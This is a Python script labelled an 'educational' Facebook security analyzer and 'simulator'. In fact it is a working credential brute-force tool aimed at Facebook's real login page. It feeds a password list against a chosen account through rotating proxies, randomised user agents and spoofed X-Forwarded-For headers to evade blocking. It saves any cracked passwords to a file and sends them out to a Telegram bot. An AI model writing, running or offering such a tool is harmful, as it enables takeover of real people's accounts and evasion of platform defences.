#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import json
import random
import threading
import queue
import requests
import urllib.parse
from datetime import datetime
from html.parser import HTMLParser
from getpass import getpass
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from rich.console import Console
    from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from rich.markdown import Markdown
except ImportError:
    print("Installing required packages...")
    os.system("pip install rich requests html5lib > /dev/null 2>&1")
    from rich.console import Console
    from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from rich.markdown import Markdown

try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet > /dev/null 2>&1")
    import pyfiglet

VERSION = "1.0.0"
BANNER_TEXT = "FB Security Analyzer"
SUCCESS_FILE = "success.txt"
CONFIG_FILE = "config.json"
MAX_RETRIES = 3
REQUEST_TIMEOUT = 15
BASE_URL = "https://mbasic.facebook.com"
LOGIN_URL = f"{BASE_URL}/login.php"
HEADERS = {
    "authority": "mbasic.facebook.com",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dpr": "1",
    "sec-ch-prefers-color-scheme": "light",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-full-version-list": '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.217", "Google Chrome";v="120.0.6099.217"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": '"15.0.0"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

console = Console()

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.form_data = {}
        self.in_form = False
        self.current_form = None
        
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self.in_form = True
            self.current_form = attrs.get("id", "")
        elif self.in_form and tag == "input":
            if attrs.get("type") in ["hidden", "submit"]:
                name = attrs.get("name")
                value = attrs.get("value", "")
                if name:
                    self.form_data[name] = value

    def handle_endtag(self, tag):
        if tag == "form" and self.in_form:
            self.in_form = False

def validate_uid(uid):
    return uid.isdigit() or re.match(r'^[a-zA-Z0-9.]+$', uid)

def validate_url(url):
    patterns = [
        r'https?://(?:www\.|m\.|mbasic\.)?facebook\.com/(?:profile\.php\?id=)?([a-zA-Z0-9.]+)',
        r'https?://(?:www\.|m\.|mbasic\.)?fb\.com/(?:profile\.php\?id=)?([a-zA-Z0-9.]+)'
    ]
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    return None

def get_uid():
    while True:
        uid_input = console.input("[bold cyan]Enter Facebook UID/Username/URL:[/] ").strip()
        if validate_uid(uid_input):
            return uid_input
        extracted_uid = validate_url(uid_input)
        if extracted_uid:
            return extracted_uid
        console.print("[bold red]Invalid input! Please enter valid UID or Facebook profile URL.[/]")

def load_file_lines(filename):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]File not found: {filename}[/]")
        return []
    except Exception as e:
        console.print(f"[bold red]Error reading file: {e}[/]")
        return []

def validate_proxy(proxy):
    try:
        proxies = {"http": proxy, "https": proxy}
        test_url = "https://api.ipify.org?format=json"
        response = requests.get(test_url, proxies=proxies, timeout=REQUEST_TIMEOUT)
        return response.status_code == 200
    except:
        return False

def rotate_user_agent():
    desktop_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    ]
    mobile_agents = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(desktop_agents + mobile_agents)

def get_stealth_headers():
    headers = HEADERS.copy()
    headers["user-agent"] = rotate_user_agent()
    headers["x-forwarded-for"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    headers["accept-encoding"] = "gzip, deflate, br"
    headers["connection"] = "keep-alive"
    return headers

def parse_form_fields(html_content):
    parser = FormParser()
    parser.feed(html_content)
    return parser.form_data

def send_telegram_notification(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
    except Exception:
        pass

def save_success(uid, password, status, proxy=""):
    with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"UID: {uid} | Password: {password} | Status: {status} | Proxy: {proxy} | Time: {timestamp}\n")

class FacebookBruteForceSimulator:
    def __init__(self):
        self.uid = ""
        self.password_list = []
        self.proxy_list = []
        self.active_proxies = []
        self.proxy_index = 0
        self.total_passwords = 0
        self.tested = 0
        self.success_count = 0
        self.locked_count = 0
        self.twofa_count = 0
        self.failed_count = 0
        self.proxy_fail_count = 0
        self.running = True
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.tg_token = ""
        self.tg_chat_id = ""
        self.concurrency = 5
        self.proxy_enabled = False
        self.shuffle_passwords = False
        self.proxy_score = {}
        self.proxy_blacklist = set()

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r") as f:
                    config = json.load(f)
                    self.tg_token = config.get("telegram_token", "")
                    self.tg_chat_id = config.get("telegram_chat_id", "")
                    self.concurrency = config.get("concurrency", 5)
                    self.shuffle_passwords = config.get("shuffle_passwords", False)
            except:
                pass

    def save_config(self):
        config = {
            "telegram_token": self.tg_token,
            "telegram_chat_id": self.tg_chat_id,
            "concurrency": self.concurrency,
            "shuffle_passwords": self.shuffle_passwords
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f)

    def get_inputs(self):
        try:
            # Display banner
            if "pyfiglet" in sys.modules:
                banner = pyfiglet.figlet_format(BANNER_TEXT, font="small")
                console.print(f"[bold green]{banner}[/]")
            else:
                console.print(f"[bold green]{BANNER_TEXT} v{VERSION}[/]")
            
            console.print(Panel.fit("Educational Security Research Tool", style="bold blue"))
            
            # Get target
            self.uid = get_uid()
            
            # Get password list
            pass_file = console.input("[bold cyan]Path to password list:[/] ").strip()
            self.password_list = load_file_lines(pass_file)
            if not self.password_list:
                console.print("[bold red]No valid passwords found. Exiting.[/]")
                sys.exit(1)
                
            self.total_passwords = len(self.password_list)
            
            # Get proxy list
            proxy_file = console.input("[bold cyan]Path to proxy list (optional):[/] ").strip()
            if proxy_file:
                self.proxy_list = load_file_lines(proxy_file)
                if self.proxy_list:
                    self.proxy_enabled = True
                    console.print(f"[green]Loaded {len(self.proxy_list)} proxies[/]")
                else:
                    console.print("[yellow]No valid proxies found. Using direct connection.[/]")
            
            # Telegram config
            self.load_config()
            if self.tg_token and self.tg_chat_id:
                use_tg = console.input(f"[cyan]Use saved Telegram config? (Y/n):[/] ").strip().lower()
                if use_tg == "n":
                    self.tg_token = ""
                    self.tg_chat_id = ""
            
            if not self.tg_token:
                self.tg_token = console.input("[cyan]Telegram Bot Token (optional):[/] ").strip()
            if self.tg_token and not self.tg_chat_id:
                self.tg_chat_id = console.input("[cyan]Telegram Chat ID (optional):[/] ").strip()
            
            # Concurrency
            threads = console.input(f"[cyan]Threads (default {self.concurrency}):[/] ").strip()
            if threads.isdigit():
                self.concurrency = min(int(threads), 50)
            
            # Shuffle passwords
            shuffle = console.input("[cyan]Shuffle passwords? (y/N):[/] ").strip().lower()
            if shuffle == "y":
                self.shuffle_passwords = True
            
            self.save_config()
            
        except KeyboardInterrupt:
            console.print("\n[bold yellow]Operation cancelled by user.[/]")
            sys.exit(0)

    def get_next_proxy(self):
        if not self.proxy_enabled or not self.active_proxies:
            return None
            
        with self.lock:
            proxy = self.active_proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.active_proxies)
            return proxy

    def validate_proxies(self):
        if not self.proxy_list:
            return
            
        console.print("[yellow]Validating proxies...[/]")
        valid_proxies = []
        
        with ThreadPoolExecutor(max_workers=min(20, len(self.proxy_list))) as executor:
            futures = {executor.submit(validate_proxy, proxy): proxy for proxy in self.proxy_list}
            for future in as_completed(futures):
                proxy = futures[future]
                try:
                    if future.result():
                        valid_proxies.append(proxy)
                except:
                    pass
                    
        self.active_proxies = valid_proxies
        console.print(f"[green]Active proxies: {len(self.active_proxies)}/{len(self.proxy_list)}[/]")

    def get_session(self):
        session = requests.Session()
        session.headers.update(get_stealth_headers())
        
        proxy = self.get_next_proxy()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
            
        return session, proxy

    def process_login(self, password):
        if not self.running:
            return
            
        for attempt in range(MAX_RETRIES):
            try:
                session, proxy = self.get_session()
                
                # Get login page
                response = session.get(LOGIN_URL, timeout=REQUEST_TIMEOUT)
                if response.status_code != 200:
                    raise Exception("Failed to load login page")
                
                # Parse form
                form_data = parse_form_fields(response.text)
                if not form_data:
                    raise Exception("Could not parse login form")
                
                # Prepare login data
                form_data["email"] = self.uid
                form_data["pass"] = password
                
                # Submit login
                response = session.post(
                    LOGIN_URL,
                    data=form_data,
                    allow_redirects=True,
                    timeout=REQUEST_TIMEOUT
                )
                
                # Analyze response
                if "c_user" in session.cookies:
                    if "checkpoint" in response.url:
                        status = "2FA_REQUIRED"
                    else:
                        status = "SUCCESS"
                elif "Your account has been locked" in response.text:
                    status = "ACCOUNT_LOCKED"
                else:
                    status = "FAILED"
                
                # Update counters and handle results
                with self.lock:
                    self.tested += 1
                    if status == "SUCCESS":
                        self.success_count += 1
                        save_success(self.uid, password, "SUCCESS", proxy)
                        if self.tg_token and self.tg_chat_id:
                            msg = f"✅ Facebook Access Found\nUID: {self.uid}\nPassword: {password}"
                            send_telegram_notification(self.tg_token, self.tg_chat_id, msg)
                        return
                    elif status == "2FA_REQUIRED":
                        self.twofa_count += 1
                        save_success(self.uid, password, "2FA_REQUIRED", proxy)
                        if self.tg_token and self.tg_chat_id:
                            msg = f"⚠️ 2FA Required\nUID: {self.uid}\nPassword: {password}"
                            send_telegram_notification(self.tg_token, self.tg_chat_id, msg)
                        return
                    elif status == "ACCOUNT_LOCKED":
                        self.locked_count += 1
                        return
                    else:
                        self.failed_count += 1
                        return
                        
            except requests.exceptions.ProxyError:
                with self.lock:
                    self.proxy_fail_count += 1
                    if proxy:
                        self.proxy_blacklist.add(proxy)
                        if proxy in self.active_proxies:
                            self.active_proxies.remove(proxy)
            except:
                pass
            
            # Exponential backoff
            time.sleep(2 ** attempt)
        
        with self.lock:
            self.failed_count += 1
            self.tested += 1

    def worker(self):
        while self.running:
            try:
                password = self.password_queue.get(timeout=1)
                self.process_login(password)
                self.password_queue.task_done()
            except queue.Empty:
                break

    def start_attack(self):
        # Prepare password queue
        self.password_queue = queue.Queue()
        if self.shuffle_passwords:
            random.shuffle(self.password_list)
        for password in self.password_list:
            self.password_queue.put(password)
            
        # Validate proxies if enabled
        if self.proxy_enabled:
            self.validate_proxies()
            
        # Start threads
        console.print(f"[bold green]Starting attack with {self.concurrency} threads...[/]")
        
        progress_columns = [
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("•"),
            TextColumn("Tested: [bold]{task.completed}/{task.total}"),
            TextColumn("•"),
            SpinnerColumn("dots")
        ]
        
        try:
            with Progress(*progress_columns, console=console) as progress:
                main_task = progress.add_task("[cyan]Testing credentials...", total=self.total_passwords)
                
                with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
                    futures = [executor.submit(self.worker) for _ in range(self.concurrency)]
                    
                    while self.running and any(not f.done() for f in futures):
                        progress.update(main_task, completed=self.tested, total=self.total_passwords)
                        time.sleep(0.1)
                        
                        # Check for completion
                        if self.tested >= self.total_passwords:
                            self.running = False
                            
            # Final progress update
            progress.update(main_task, completed=self.tested, total=self.total_passwords)
            
        except KeyboardInterrupt:
            console.print("\n[bold yellow]Stopping threads...[/]")
            self.running = False
            for _ in range(self.concurrency):
                try:
                    self.password_queue.put(None, block=False)
                except:
                    pass
                    
        # Print summary
        self.print_summary()

    def print_summary(self):
        elapsed = time.time() - self.start_time
        mins, secs = divmod(elapsed, 60)
        
        table = Table(title="Attack Summary", show_header=True, header_style="bold magenta")
        table.add_column("Metric", justify="left")
        table.add_column("Value", justify="right")
        
        table.add_row("Target UID", self.uid)
        table.add_row("Total Passwords", str(self.total_passwords))
        table.add_row("Tested", str(self.tested))
        table.add_row("Successful Logins", f"[green]{self.success_count}")
        table.add_row("2FA Required", f"[yellow]{self.twofa_count}")
        table.add_row("Locked Accounts", f"[red]{self.locked_count}")
        table.add_row("Failed Attempts", str(self.failed_count))
        table.add_row("Proxy Failures", str(self.proxy_fail_count))
        table.add_row("Time Elapsed", f"{int(mins)}m {int(secs)}s")
        
        console.print()
        console.print(table)
        console.print(f"[bold]Results saved to: {SUCCESS_FILE}[/]")
        
        if self.success_count or self.twofa_count:
            console.print("[bold green]Successfully found valid credentials![/]")
        else:
            console.print("[bold red]No valid credentials found.[/]")

    def run(self):
        try:
            self.get_inputs()
            self.start_attack()
        except Exception as e:
            console.print(f"[bold red]Critical error: {str(e)}[/]")
            sys.exit(1)

if __name__ == "__main__":
    simulator = FacebookBruteForceSimulator()
    simulator.run()